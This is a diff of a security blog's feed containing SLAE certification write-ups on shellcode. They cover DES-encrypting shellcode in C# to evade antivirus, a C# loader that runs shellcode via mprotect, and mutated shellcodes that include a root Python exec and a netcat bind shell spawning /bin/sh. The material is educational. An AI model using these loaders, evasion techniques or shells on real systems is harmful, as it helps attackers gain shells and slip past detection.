-&lt;/pre&gt;&lt;/div&gt;</summary><category term="Python"></category></entry><entry><title>High-level language shellcode encryption on Linux (SLAE, Assignment #7)</title><link href="http://www.wryway.com/blog/high-level-language-shellcode-encryption-on-linux/" rel="alternate"></link><updated>2015-10-12T14:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:www.wryway.com,2015-10-12:blog/high-level-language-shellcode-encryption-on-linux/</id><summary type="html">&lt;p&gt;This post is similar to the &lt;a href="/blog/assembly-custom-encoding-scheme/"&gt;custom encoding&lt;/a&gt; one I wrote earlier. In this post we will transform the shellcode by means of higher-level programming language. But instead of encoding, this time we will employ encryption.&lt;/p&gt;
+&lt;/pre&gt;&lt;/div&gt;</content><category term="Python"></category></entry><entry><title>High-level language shellcode encryption on Linux (SLAE, Assignment #7)</title><link href="http://www.wryway.com/blog/high-level-language-shellcode-encryption-on-linux/" rel="alternate"></link><published>2015-10-12T14:00:00-04:00</published><updated>2015-10-12T14:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:www.wryway.com,2015-10-12:/blog/high-level-language-shellcode-encryption-on-linux/</id><summary type="html">&lt;p&gt;Evading AV by encrypting shellcode with C# on Linux&lt;/p&gt;</summary><content type="html">&lt;p&gt;This post is similar to the &lt;a href="/blog/assembly-custom-encoding-scheme/"&gt;custom encoding&lt;/a&gt; one I wrote earlier. In this post we will transform the shellcode by means of higher-level programming language. But instead of encoding, this time we will employ encryption.&lt;/p&gt;
 &lt;p&gt;We all know that inventing your own cryptography algorithm, especially if you aren't a Nobel laureate in cryptography, is a bad idea. Though when the goal is to trick a signature-based anti-virus or intrusion detection system, I would argue that this is not the case. Anyway, to not complicate things and clearly demonstrate the encryption approach, I decided to go with the .NET implementation of the DES algorithm.&lt;/p&gt;
 &lt;p&gt;My language of choice for this assignment is C#. If you don't know how to &lt;a href="/blog/shellcode-in-csharp-on-linux/"&gt;execute x86 Linux shellcode from C# application&lt;/a&gt;, please, check the link. The solution consists of two programs. The first one is used to encrypt the given shellcode, the second one to decrypt and run it. The decrypter part is based on the C# shellcode execution frame from the aforementioned post.&lt;/p&gt;
 &lt;p&gt;First comes the source code of the encrypter:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;System&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;System&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;System.Security.Cryptography&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;System.Text&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;System.Linq&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
@@ -294,16 +294,16 @@
 
 &lt;p&gt;The shellcode string, initial vector value and the encryption key are all hard-coded into the source. I know that using hard-coded keys and initial vectors is generally a very bad idea, but remember that we are just fooling signature-based software here, not a human analyst. The shellcode used starts the &lt;code&gt;/bin/sh&lt;/code&gt; shell.&lt;/p&gt;
 &lt;p&gt;After compiling and running the above source code, we will get an output with original, encrypted, and decrypted shellcode strings: &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;mcs encrypter.cs &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./encrypter.exe
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mcs encrypter.cs &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./encrypter.exe
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The output will also contain a comparison result of the original and decrypted shellcode strings:&lt;/p&gt;
-&lt;p&gt;&lt;img alt="Running shellcode encrypter" src="http://www.wryway.com/blog/high-level-language-shellcode-encryption-on-linux/running-shellcode-encrypter.png" title="Running shellcode encrypter" /&gt;
+&lt;p&gt;&lt;img alt="Running shellcode encrypter" src="http://www.wryway.com/blog/high-level-language-shellcode-encryption-on-linux/running-shellcode-encrypter.png" title="Running shellcode encrypter"&gt;
 &lt;div class="img-caption"&gt;Running shellcode encrypter&lt;/div&gt;&lt;/p&gt;
 &lt;p&gt;Note that the size of the encrypted strings increased by 3 bytes. This fact may or may not be an issue while writing an exploit for a particular program. If it becomes an issue, some alternative encryption algorithm that does not increase the payload size should be chosen.&lt;/p&gt;
 &lt;p&gt;The encrypted string from the encrypter's output, along with the same IV and key, is pated into decrypter source code:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;System&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;System&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;System.Runtime.InteropServices&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;Mono.Unix.Native&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;System.Security.Cryptography&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
@@ -421,12 +421,12 @@
 
 
 &lt;p&gt;After compiling and running the decrypter&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;mcs -reference:Mono.Posix decrypter.cs &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./decrypter.exe
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mcs -reference:Mono.Posix decrypter.cs &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./decrypter.exe
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;we should get output similar to the one shown on the following print screen:&lt;/p&gt;
-&lt;p&gt;&lt;img alt="Running shellcode decrypter" src="http://www.wryway.com/blog/high-level-language-shellcode-encryption-on-linux/running-shellcode-decrypter.png" title="Running shellcode decrypter" /&gt;
+&lt;p&gt;&lt;img alt="Running shellcode decrypter" src="http://www.wryway.com/blog/high-level-language-shellcode-encryption-on-linux/running-shellcode-decrypter.png" title="Running shellcode decrypter"&gt;
 &lt;div class="img-caption"&gt;Running shellcode decrypter&lt;/div&gt;&lt;/p&gt;
 &lt;p&gt;As we can see everything worked out as expected.&lt;/p&gt;
 &lt;div class="divider"&gt;&lt;/div&gt;
@@ -439,19 +439,19 @@
 
 &lt;p&gt;&lt;hr&gt;
 This blog post was created to fulfill the requirements of the &lt;a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/"&gt;SecurityTube Linux Assembly Expert&lt;/a&gt; certification. Student id: SLAE-685.&lt;/p&gt;
-&lt;p&gt;The source files created while completing the assignment can be found in my &lt;a href="https://github.com/reider-roque/slae"&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;</summary><category term="SLAE"></category><category term="C-Sharp"></category><category term="Linux"></category></entry><entry><title>Executing shellcode from C# on Linux</title><link href="http://www.wryway.com/blog/shellcode-in-csharp-on-linux/" rel="alternate"></link><updated>2015-10-11T19:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:www.wryway.com,2015-10-11:blog/shellcode-in-csharp-on-linux/</id><summary type="html">&lt;p&gt;In this post I will show you how to run shellcode from a C# application on Linux. I realize that unlike, say, Python, &lt;a href="http://www.mono-project.com/"&gt;Mono&lt;/a&gt; is not present on most vanilla Linux installations. So there are not many cases when you will be able to leverage this ability. But it is out there and you never know what you can run into in the wild. With that being said, let's first install Mono.&lt;/p&gt;
+&lt;p&gt;The source files created while completing the assignment can be found in my &lt;a href="https://github.com/reider-roque/slae"&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;</content><category term="SLAE"></category><category term="C-Sharp"></category><category term="Linux"></category></entry><entry><title>Executing shellcode from C# on Linux</title><link href="http://www.wryway.com/blog/shellcode-in-csharp-on-linux/" rel="alternate"></link><published>2015-10-11T19:00:00-04:00</published><updated>2015-10-11T19:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:www.wryway.com,2015-10-11:/blog/shellcode-in-csharp-on-linux/</id><summary type="html">&lt;p&gt;Executing shellcode from C# on Linux&lt;/p&gt;</summary><content type="html">&lt;p&gt;In this post I will show you how to run shellcode from a C# application on Linux. I realize that unlike, say, Python, &lt;a href="http://www.mono-project.com/"&gt;Mono&lt;/a&gt; is not present on most vanilla Linux installations. So there are not many cases when you will be able to leverage this ability. But it is out there and you never know what you can run into in the wild. With that being said, let's first install Mono.&lt;/p&gt;
 &lt;h1&gt;Mono installation&lt;/h1&gt;
 &lt;p&gt;I am using a freshly downloaded &lt;a href="https://www.offensive-security.com/kali-linux-vmware-arm-image-download/"&gt;x86 Kali image&lt;/a&gt; here. After upgrading and changing the default password I followed the &lt;a href="http://www.mono-project.com/docs/getting-started/install/linux/"&gt;installation instructions&lt;/a&gt; found in official Mono documentation:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# Become root if you aren&amp;#39;t&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Become root if you aren&amp;#39;t&lt;/span&gt;
 su - root
-&lt;span class="c"&gt;# Add mono-project packages signing key so all packages you pull from their repo are trusted&lt;/span&gt;
+&lt;span class="c1"&gt;# Add mono-project packages signing key so all packages you pull from their repo are trusted&lt;/span&gt;
 apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF
-&lt;span class="c"&gt;#  Add mono-project repositories&lt;/span&gt;
+&lt;span class="c1"&gt;#  Add mono-project repositories&lt;/span&gt;
 &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;deb http://download.mono-project.com/repo/debian wheezy main&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; tee /etc/apt/sources.list.d/mono-xamarin.list
 &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;deb http://download.mono-project.com/repo/debian wheezy-libjpeg62-compat main&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; tee -a /etc/apt/sources.list.d/mono-xamarin.list
-&lt;span class="c"&gt;# Update your package index&lt;/span&gt;
+&lt;span class="c1"&gt;# Update your package index&lt;/span&gt;
 apt-get update
-&lt;span class="c"&gt;# Install Mono-related packages&lt;/span&gt;
+&lt;span class="c1"&gt;# Install Mono-related packages&lt;/span&gt;
 apt-get install mono-complete monodevelop
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -460,7 +460,7 @@ apt-get install mono-complete monodevelop
 &lt;h1&gt;Windows prototype and Linux port&lt;/h1&gt;
 &lt;p&gt;While researching the issue I came across a wonderful post that provided a working example of &lt;a href="https://maxxor.org/posts/execute-native-x86-shellcode-in-csharp"&gt;shellcode execution in C# on Windows&lt;/a&gt;. The example uses WinAPI &lt;a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366898(v=vs.85).aspx"&gt;VirtualProtect&lt;/a&gt; function to make the shellcode containing region of memory executable. Linux analog of VirtualProtect function is &lt;a href="http://linux.die.net/man/2/mprotect"&gt;mprotect&lt;/a&gt;. Both VirtualProtect and mprotect change protection on pages, not on arbitrary regions of memory. So, even if your shellcode takes only 21 bytes, the whole page containing the code will have to be made executable. The difference between VirtaulProtect and mprotect is that you don't have to pass the base address of the page containing shellcode to the first one; you can just &lt;a href="http://stackoverflow.com/questions/10838902/does-virtualprotect-require-the-address-of-the-beginning-of-the-page"&gt;pass the shellcode address&lt;/a&gt;. And to the second one you must pass the base address of the page containing the shellcode.&lt;/p&gt;
 &lt;p&gt;Here is the source:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;System&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;System&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;System.Runtime.InteropServices&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;Mono.Unix.Native&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 
@@ -561,17 +561,17 @@ apt-get install mono-complete monodevelop
 &lt;p&gt;The shellcode used in the source is an x86 Linux shellcode that starts &lt;em&gt;/bin/sh&lt;/em&gt;.&lt;/p&gt;
 &lt;p&gt;The PAGE_SIZE constant used in the code is, by default, equal to 4096 bytes in Linux. The exact value is determined in runtime.&lt;/p&gt;
 &lt;p&gt;To compile the above source you must reference the standard &lt;em&gt;Mono.Posix.dll&lt;/em&gt; assembly; used in the project &lt;code&gt;Mono.Unix.Native&lt;/code&gt; namespace lives there:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;mcs /reference:Mono.Posix scframe.cs
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mcs /reference:Mono.Posix scframe.cs
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;After running the resulted executable&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;./scframe.exe
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./scframe.exe
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;we should see the following output:&lt;/p&gt;
-&lt;p&gt;&lt;img alt="Shellcode running output" src="http://www.wryway.com/blog/shellcode-in-csharp-on-linux/csharp-shellcode-running-output.png" title="Shellcode running output" /&gt;
+&lt;p&gt;&lt;img alt="Shellcode running output" src="http://www.wryway.com/blog/shellcode-in-csharp-on-linux/csharp-shellcode-running-output.png" title="Shellcode running output"&gt;
 &lt;div class="img-caption"&gt;Shellcode running output&lt;/div&gt;&lt;/p&gt;
 &lt;p&gt;Alternatively to referencing the Mono.Posix.dll assembly we could directly reference &lt;code&gt;mprotect()&lt;/code&gt; and &lt;code&gt;sysconf()&lt;/code&gt; functions from &lt;em&gt;libc.so&lt;/em&gt; library. In that case we should remember that library name passed to the &lt;code&gt;DllImport&lt;/code&gt; attribute should be either &lt;em&gt;libc&lt;/em&gt; or &lt;em&gt;libc.so.6&lt;/em&gt; (or whatever version is current). Passing &lt;em&gt;libc.so&lt;/em&gt; will produce the &lt;em&gt;Mono: DllImport error loading library&lt;/em&gt; error. One inconvenience of not using the &lt;code&gt;Mono.Posix.dll&lt;/code&gt; namespace is that it is not possible (at least I couldn't find how) to reference the standard C global &lt;code&gt;errno&lt;/code&gt; variable to get the error code of the last libc failed function. Overall there is no benefit of using this version instead of the given above. Both versions of the source can be found in the &lt;a href="http://www.wryway.com/blog/shellcode-in-csharp-on-linux/scframe.zip"&gt;accompanying archive&lt;/a&gt;.&lt;/p&gt;
 &lt;h1&gt;Debugging&lt;/h1&gt;
@@ -582,17 +582,17 @@ apt-get install mono-complete monodevelop
 &lt;li&gt;By inserting the &lt;code&gt;\CC&lt;/code&gt; byte in the beginning of the shellcode, which corresponds to &lt;code&gt;int3&lt;/code&gt; Assembly mnemonic. I used this to catch the moment of passing execution flow to the shellcode.&lt;/li&gt;
 &lt;li&gt;By setting a breakpoint on a method name as described in &lt;a href="http://www.mono-project.com/docs/debug+profile/debug/#debugging-with-gdb"&gt;Mono documentation&lt;/a&gt;:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;handle SIGXCPU SIG33 SIG35 SIGPWR nostop noprint&amp;#39;&lt;/span&gt; &amp;gt; mono-gdb-settings
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;handle SIGXCPU SIG33 SIG35 SIGPWR nostop noprint&amp;#39;&lt;/span&gt; &amp;gt; mono-gdb-settings
 gdb -x mono-gdb-settings mono
 &lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; run --debug --break &lt;span class="s2"&gt;&amp;quot;MainClass:Main&amp;quot;&lt;/span&gt; scframe.exe
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;To set a breakpoint on a particular line I ended up moving it and a few lines that followed into a separate method and then calling that method from where I had plucked out those lines. Then I set a breakpoint on the newly created method name and debugged it that way.&lt;/p&gt;</summary><category term="C-Sharp"></category><category term="Linux"></category></entry><entry><title>Mutating existing shellcodes (SLAE, Assignment #6)</title><link href="http://www.wryway.com/blog/mutating-existing-shellcodes/" rel="alternate"></link><updated>2015-10-08T20:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:www.wryway.com,2015-10-08:blog/mutating-existing-shellcodes/</id><summary type="html">&lt;p&gt;This post is about modifying shellcode by replacing instructions it uses without changing the overall logic of the given shellcode. This is most often done to evade antivirus and intrusion detection systems.&lt;/p&gt;
+&lt;p&gt;To set a breakpoint on a particular line I ended up moving it and a few lines that followed into a separate method and then calling that method from where I had plucked out those lines. Then I set a breakpoint on the newly created method name and debugged it that way.&lt;/p&gt;</content><category term="C-Sharp"></category><category term="Linux"></category></entry><entry><title>Mutating existing shellcodes (SLAE, Assignment #6)</title><link href="http://www.wryway.com/blog/mutating-existing-shellcodes/" rel="alternate"></link><published>2015-10-08T20:00:00-04:00</published><updated>2015-10-08T20:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:www.wryway.com,2015-10-08:/blog/mutating-existing-shellcodes/</id><summary type="html">&lt;p&gt;Intoducing shellcode changes without alterin its logic&lt;/p&gt;</summary><content type="html">&lt;p&gt;This post is about modifying shellcode by replacing instructions it uses without changing the overall logic of the given shellcode. This is most often done to evade antivirus and intrusion detection systems.&lt;/p&gt;
 &lt;p&gt;There are actually polymorphic engines in existence that can take a program and transform it so that the modified version consists of different code yet operates with the same functionality, but in this post we will be doing everything manually.&lt;/p&gt;
 &lt;h1&gt;Sample #1: setreuid() + exec /usr/bin/python - 54 bytes by Ali Razmjoo&lt;/h1&gt;
 &lt;p&gt;The first sample from the shell-storm.org I will use here is the &lt;a href="http://shell-storm.org/shellcode/files/shellcode-886.php"&gt;shellcode that starts the Python interpreter as root&lt;/a&gt;. On the referenced page the shellcode is presented using AT&amp;amp;T syntax. Here is the version translated to the Intel syntax with my comments (I renamed the &lt;em&gt;first&lt;/em&gt; and &lt;em&gt;last&lt;/em&gt; labels so that their purpose is more obvious):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
     &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
 
 &lt;span class="nl"&gt;_start:&lt;/span&gt;
@@ -622,8 +622,8 @@ gdb -x mono-gdb-settings mono
 
 
 &lt;p&gt;Note that the above Assembly program compiles, but does not work by itself because of the self-modifying part. Remember that modifying the executable &lt;em&gt;.text&lt;/em&gt; section at runtime is a no-no and leads to a segmentation fault. To test the shellcode we have to employ a framing C program. The shellcode itself can be copied from the referenced above web page or regenerated using the &lt;a href="https://github.com/reider-roque/reed/tree/master/tools"&gt;scdump&lt;/a&gt; tool after building an executable from the above source code.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
-&lt;span class="cp"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
 
 &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x5b\x31\xc0\x88\x43\x0f\x89\x5b\x10\x89\x43\x14\xb0\x0b\x8d\x4b\x10\x8d\x53&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
@@ -639,10 +639,10 @@ gdb -x mono-gdb-settings mono
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;&lt;img alt="Testing the shellcode" src="http://www.wryway.com/blog/mutating-existing-shellcodes/testing-the-shellcode.png" title="Testing the shellcode" /&gt;
+&lt;p&gt;&lt;img alt="Testing the shellcode" src="http://www.wryway.com/blog/mutating-existing-shellcodes/testing-the-shellcode.png" title="Testing the shellcode"&gt;
 &lt;div class="img-caption"&gt;Testing the shellcode&lt;/div&gt;&lt;/p&gt;
 &lt;p&gt;At first, I wanted to do a step by step modification of every couple instructions preserving the overall functionality, but then, after reviewing the given shellcode architecture, I realized that it is quite inefficient. So I decided to rewrite most of the code employing a couple of shellcode-shortening techniques I learned while taking the SLAE course. Follows my modified copy of the shellcode with some comments:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
     &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
 
 &lt;span class="nl"&gt;_start:&lt;/span&gt;
@@ -667,27 +667,27 @@ gdb -x mono-gdb-settings mono
 
 &lt;p&gt;First off all note that this shellcode is 38 bytes long vs 54 bytes of the original one, which is a 30% (!) reduction. Here is the list of tricks I employed to reduce the shellcode size:&lt;/p&gt;
 &lt;p&gt;1) In the beginning the EAX register needs to be set to the 0x46, which is the syscall code of the setreuid. For that the original shellcode uses this sequence, which takes 4 bytes:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
 &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x46&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;To shave off a byte I replaced it with the following equivalent:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="mh"&gt;0x46&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="mh"&gt;0x46&lt;/span&gt;
 &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;2) The original shellcode uses the jmp-call-pop technique for accessing the data in the location-independent manner. I replaced this approach with pushing the string data directly onto the stack. This change alone saved us the most number of bytes.&lt;/p&gt;
 &lt;p&gt;3) The original shellcode contains code that was setting unnecessary arguments to &lt;code&gt;execve&lt;/code&gt; syscall:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;lea&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
 &lt;span class="nf"&gt;lea&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;In reality both ECX and EDX registers (2nd and 3rd arguments to execve syscall correspondingly) can be set to 0.&lt;/p&gt;
 &lt;p&gt;4) Lastly, to set EAX and EDX registers to 0 in one swoop I used the multiplication instruction:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;mul&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;mul&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -695,25 +695,25 @@ gdb -x mono-gdb-settings mono
 &lt;p&gt;To convert the &lt;em&gt;//usr/bin/python&lt;/em&gt; string to instructions that are used to push the string onto the stack I used the &lt;a href="https://github.com/reider-roque/reed/tree/master/tools"&gt;str4sc&lt;/a&gt; tool. I had to add an extra slash to the path so that the string length became a multiple of 4, a condition necessary for storing null-free strings on the stack.&lt;/p&gt;
 &lt;h1&gt;Sample #2: /bin/nc -le /bin/sh -vp 17771 - 58 bytes by Oleg Boytsev&lt;/h1&gt;
 &lt;p&gt;Here comes our second shell-storm sample - the &lt;a href="http://shell-storm.org/shellcode/files/shellcode-872.php"&gt;netcat assisted bind shell&lt;/a&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;global&lt;/span&gt; &lt;span class="no"&gt;_start&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;global&lt;/span&gt; &lt;span class="no"&gt;_start&lt;/span&gt;
 &lt;span class="nf"&gt;section&lt;/span&gt; &lt;span class="no"&gt;.text&lt;/span&gt;
  &lt;span class="nl"&gt;_start:&lt;/span&gt;
     &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;
     &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="no"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;edx&lt;/span&gt;
     &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="no"&gt;eax&lt;/span&gt;
-    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mi"&gt;0x31373737&lt;/span&gt;     &lt;span class="err"&gt;;&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="no"&gt;vp17771&lt;/span&gt;
